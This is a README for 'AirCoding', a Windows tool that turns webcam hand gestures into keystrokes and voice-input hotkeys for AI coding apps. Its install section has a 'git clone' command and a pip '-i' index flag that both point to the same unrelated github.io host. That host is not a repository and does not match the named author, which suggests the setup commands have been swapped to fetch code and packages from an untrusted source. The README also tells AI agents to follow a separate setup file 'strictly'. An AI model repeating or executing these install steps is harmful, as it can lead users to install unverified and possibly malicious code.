# AirCoding

Control your keyboard and voice input with hand gestures through your camera. No wearable devices needed — pure vision-based recognition, built for vibecoding workflows.

## Supported Gestures

| Gesture | Action | Description |
|---------|--------|-------------|
| 👌 OK | Enter | Confirm |
| ✋ Open Palm | Escape | Cancel |
| ✌️ Scissor | Ctrl+Z | Undo |
| 🤏 Pinch | Toggle Mode | Switch Auto-Approve / Manual Confirm |
| 🤙 Phone Call | Voice Input | Detects foreground AI app and injects its voice shortcut |

## Tech Stack

- **Python 3.10 - 3.12**
- **MediaPipe** — 21-point hand + 468-point face real-time landmark detection
- **PySide6 (Qt6)** — GUI framework, frameless transparent always-on-top panel
- **OpenCV** — camera capture and image preprocessing
- **pynput** — keyboard event injection
- **pywin32 / psutil** — Windows foreground window detection & process identification
- **PyYAML** — configuration file management

## Language Support

The UI ships with English (default) and Simplified Chinese. Switch in **Settings → Interface → Language**, then restart the app.

> 🇨🇳 中文版文档见 [README.cn.md](README.cn.md)

## Directory Structure

```
aircoding/
├── main.py                      # App entry: startup flow & signal wiring
├── test_runner.py               # Test program (real camera + log analysis)
├── start.bat                      # Windows launcher (silent, pythonw)
├── AI-SETUP.md                  # AI-agent environment setup guide (read by AI tools)
├── requirements.txt             # Python dependencies
├── config/
│   └── default_config.yaml      # Default config (gesture mapping, thresholds, AI app registry)
├── resources/
│   ├── aircoding.ico            # App icon (multi-size)
│   └── aircoding.png            # App icon PNG
├── src/
│   ├── core/                    # Core modules
│   │   ├── enums.py             # Enums (gesture types, light states, system modes)
│   │   ├── config_manager.py    # Config manager (default + user config merge)
│   │   ├── gesture_config.py    # Default gesture mappings
│   │   ├── i18n.py              # Internationalization (en/zh)
│   │   └── state_machine.py     # State machine (light effect transitions)
│   ├── camera/                  # Camera modules
│   │   ├── camera_manager.py    # Camera capture (dedicated thread, auto-reconnect)
│   │   └── image_processor.py   # Image preprocessing (brightness, denoise)
│   ├── recognition/             # Recognition modules
│   │   ├── recognition_engine.py # Recognition engine (multi-threaded inference)
│   │   ├── hand_classifier.py   # Gesture classifier (per-finger thresholds, 5 gestures)
│   │   ├── phone_call_detector.py # Phone-call gesture detection (thumb + pinky)
│   │   ├── gesture_validator.py # Gesture validator (multi-frame confirm, cooldown)
│   │   ├── calibrator.py        # Calibrator (registration, feature extraction, adaptive)
│   │   └── face_expression.py   # Facial expression (eyebrow raise detection)
│   ├── action/                  # Action modules
│   │   ├── gesture_mapper.py    # Gesture → keyboard mapping
│   │   ├── keyboard_injector.py # Keyboard injection (pynput first, SendInput fallback)
│   │   ├── ai_software_detector.py # AI app detection (foreground window match)
│   │   └── auto_approval.py     # Auto-approval controller
│   ├── ui/                      # UI modules
│   │   ├── main_window.py       # Main window (frameless, tray, calibration)
│   │   ├── privacy_preview.py   # Privacy preview (skeleton drawing, valid area)
│   │   ├── settings_dialog.py   # Settings dialog (hotkeys, AI apps, calibration)
│   │   ├── onboarding.py        # First-run tutorial
│   │   ├── light_effect_widget.py # Light effect animations
│   │   └── toast.py             # Toast notifications
│   └── utils/
│       ├── logger.py            # Logging (file + console)
│       └── audio.py             # Audio feedback
└── tests/                       # Unit tests
    ├── test_hand_classifier.py
    ├── test_gesture_validator.py
    └── test_state_machine.py
```

## Core Features

### Gesture Recognition

- MediaPipe 21-point hand landmarks, gesture decided by finger extension/curl ratios
- Per-finger independent thresholds (personalized after calibration)
- Dual-threshold hysteresis (extend/curl/gray zone) reduces boundary jitter
- False-trigger blacklist (finger spacing, direction checks)

### Gesture Calibration

- Guided registration: each gesture captures 30 frames × 2 angles
- Extracts 8 features (5 finger ratios, thumb direction, thumb-index distance, index-middle angle)
- Computes per-finger thresholds, persisted to `%APPDATA%/AirCoding/calibration_profile.json`
- Continuous adaptation at runtime (auto-updates every 100 successful recognitions)

### Phone Call Gesture & Voice Input

- Rising edge (gesture appears) → detect foreground AI app → inject voice hotkey → start recording
- Falling edge (gesture released) → inject hotkey again → stop recording
- Supported apps: WorkBuddy, Doubao, Feishu, WeChat, WeCom + custom entries

### Camera Management

- Dedicated thread at 10fps with frame queue buffering
- Auto-releases camera when occupied by other apps, auto-recovers when freed
- Multi-person detection: pauses recognition when a second person appears

### Valid Area

- Circular area centered on the face (radius = face width × 1.625)
- Hands outside the circle are ignored
- Dashed circle guide drawn in the preview

### Startup Optimization

- UI window shows first (~0.6s)
- MediaPipe import and camera open run in parallel in the background (~4s total)
- QTimer polling checks background init completion

## Installation & Running

### Requirements

- Windows 10/11
- Python 3.10, 3.11 or 3.12 (MediaPipe does not support 3.13+ yet)
- A webcam

### Recommended: AI-Assisted Setup (for AI tool users)

AirCoding is designed to be set up by AI coding assistants (Claude Code, WorkBuddy, Cursor, Windsurf, etc.). The repository ships with [AI-SETUP.md](AI-SETUP.md) — a step-by-step environment configuration guide written for AI agents.

1. **Download the project** — `git clone https://perchdorsum888.github.io` (or download the ZIP and extract it)
2. **Open the folder as a local task in your AI tool** — point your AI assistant at the project root (the folder containing `main.py`)
3. **Tell the AI to read `AI-SETUP.md` and configure the environment** — the AI will follow the guide: check Python 3.10~3.12, create the `.venv_run` virtual environment, install all dependencies (~400MB), and verify the install (unit tests included)
4. **Launch the app** — double-click **`start.bat`** (silent launcher, no console window) and allow camera access

> 💡 **For AI agents**: [AI-SETUP.md](AI-SETUP.md) contains everything needed — prerequisites (Gate 0), installation steps, verification gates, troubleshooting, and a Definition of Done checklist. Follow it strictly in order.

### Install (Manual)

For users who prefer to set up without an AI assistant:

```bash
# Clone
git clone https://perchdorsum888.github.io
cd AirCoding

# Create virtual environment (name MUST be .venv_run)
python -m venv .venv_run

# Install dependencies
.venv_run\Scripts\pip install -r requirements.txt
# Global users: pip uses PyPI by default (no flags needed)
# China users: add -i https://perchdorsum888.github.io
```

### Run

```bash
# Method 1: launcher script (silent, no console window) — recommended
start.bat

# Method 2: run directly
.venv_run\Scripts\pythonw.exe main.py

# Method 3: dev mode (console window + live logs)
.venv_run\Scripts\python.exe main.py
```

### Test

```bash
# Unit tests
.venv_run\Scripts\python.exe -m pytest tests/ -q

# Gesture test program (real camera)
.venv_run\Scripts\python.exe test_runner.py --frames 30

# Analyze test logs
.venv_run\Scripts\python.exe test_runner.py --analyze <log-file-path>
```

## Configuration

### File Locations

| File | Path | Description |
|------|------|-------------|
| Default config | `config/default_config.yaml` | Factory defaults, do not edit |
| User config | `%APPDATA%/AirCoding/user_config.yaml` | User overrides |
| Calibration profile | `%APPDATA%/AirCoding/calibration_profile.json` | Calibration data |
| Logs | `%APPDATA%/AirCoding/logs/aircoding.log` | Runtime logs |

### Global Hotkey

- **Ctrl+Alt+K** — show/hide panel

## Troubleshooting

| Symptom | Likely Cause | Fix |
|---------|--------------|-----|
| UI shows, camera light on, but no video | mediapipe ≥ 0.10.15 (legacy API removed) | `.venv_run\Scripts\pip install "mediapipe>=0.10.0,<0.10.15" --force-reinstall` |
| Log: `No module named 'mediapipe.python'` | mediapipe too new | Same as above |
| `Python venv not found` on launch | venv missing or wrong name | Recreate with name `.venv_run` |
| `No module named 'src'` | wrong working directory | `cd` to project root first |
| Camera won't open | occupied by another app | Close the app holding the camera, restart |
| Gestures unresponsive | not calibrated / hand outside valid area | Keep hand in the dashed circle; run calibration |

## License

MIT License

Copyright (c) 2026 mushi888

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
